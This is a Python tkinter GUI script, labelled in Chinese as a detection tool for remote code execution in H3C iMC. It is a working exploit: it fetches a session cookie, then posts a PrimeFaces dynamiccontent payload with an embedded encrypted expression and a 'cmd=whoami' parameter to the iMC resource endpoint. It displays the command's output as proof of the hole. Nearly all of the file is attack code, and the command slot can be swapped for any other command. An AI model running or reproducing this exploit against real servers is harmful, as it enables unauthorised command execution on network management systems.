import tkinter as tk
from tkinter import ttk
from tkinter import filedialog
import threading
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Application(tk.Frame):
    def __init__(self, master=None):
        super().__init__(master)
        self.master = master
        self.pack()
        self.create_window()

    def check_host(self,host):
        if len(host) == 0:
            self.text.insert(tk.END, "host不能为空")
            return None
        elif host[-1] in ['/', '\n']:
            host = host[:-1]
            if not host.startswith("http://") and not host.startswith("https://"):
                host = "http://" + host
                return host
            return host
        if not host.startswith("http://") and not host.startswith("https://"):
                host = "http://" + host
                return host
        else:
            return host
            
    def is_vuln(self,res, host):
        if res.status_code == 200:
            print("漏洞存在")
            self.text.insert(tk.END,  "漏洞存在：" + res.text)
        else:
            self.text.insert(tk.END, f"\n{res.status_code} 漏洞不存在！")

    def check_vuln(self,host):
        host = self.check_host(host)
        self.text.insert(tk.END,  f"\n开始检测：{host}")
        body = f'''pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=whoami'''
        
        headers = {
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        }
        head = {
            'Content-Length': '1567',
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Upgrade-Insecure-Requests': '1',
            'Origin': r'{host}',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.41',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Dest': 'document',
            'Referer': r'{host}/imc/javax.faces.resource/dynamiccontent.properties.xhtml',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
            'Connection': 'close'
        }
        headers2 = {}
        cookie_cu = 'currentThemeName=imc-new-webui'
        url = f'{host}/imc/login.jsf'
        rce_url = f'{host}/imc/javax.faces.resource/dynamiccontent.properties.xhtml'
        response = requests.get(url=url,headers = headers,verify=False)
        new_cookie = response.headers['Set-Cookie'].replace('Path=/imc; Secure; HttpOnly, ', '')
        cookies = new_cookie.replace('Path=/imc; Secure', '')
        Cookie = cookies + cookie_cu
        headers2.update({'Cookie':Cookie})
        headers2.update(head)
        response2 = requests.post(url=rce_url, headers=headers2, data=body,verify=False)
        res = response2
        return res

    #清除窗口内容
    def clearInput(self):
        self.text.delete("1.0","end")
        self.entry.delete("1.0","end")
 
    def create_window(self):
        #去除间隔
        self.label1 = tk.Label(self, text="请输入：")
        self.label1.grid(row=0, column=0, sticky="w", padx=10)
        self.entry = tk.Entry(self, width=30)
        self.entry.grid(row=0, column=1, sticky="w", padx=5)
        self.button2 = tk.Button(self, text="开始检测", command=self.submit)
        self.button2.grid(row=0, column=2, sticky="w", padx=10)
        self.label2 = tk.Label(self, text="检测结果")
        self.label2.grid(row=1, column=0, sticky="w", padx=10, pady=10)
        self.button1 = tk.Button(self, text="清空", command=self.clearInput)
        self.button1.grid(row=1, column=1, sticky="w", padx=10)
        self.text = tk.Text(self, width=60, height=20)
        self.text.grid(row=2, column=0, columnspan=3, padx=25, pady=10)
        root.update_idletasks()
        w = root.winfo_screenwidth()
        h = root.winfo_screenheight()
        size = tuple(int(_) for _ in root.geometry().split('+')[0].split('x'))
        x = w/2 - size[0]/2
        y = h/2 - size[1]/2
        root.geometry("%dx%d+%d+%d" % (size + (x, y)))
    
    def submit(self):
        try:
            host = self.entry.get()
            res = self.check_vuln(host)
            self.is_vuln(res, host)
        except requests.exceptions.ConnectionError as ConectError:
            self.text.insert(tk.END,  "\n连接错误，文件或目录不存在，不存在漏洞!\n")
        except requests.exceptions.MissingSchema as MissError:
            self.text.insert(tk.END,  "\nhost为空！\n")



root = tk.Tk()
root.title("H3C iMC远程代码执行检测工具")
app = Application(master=root)
app.mainloop()

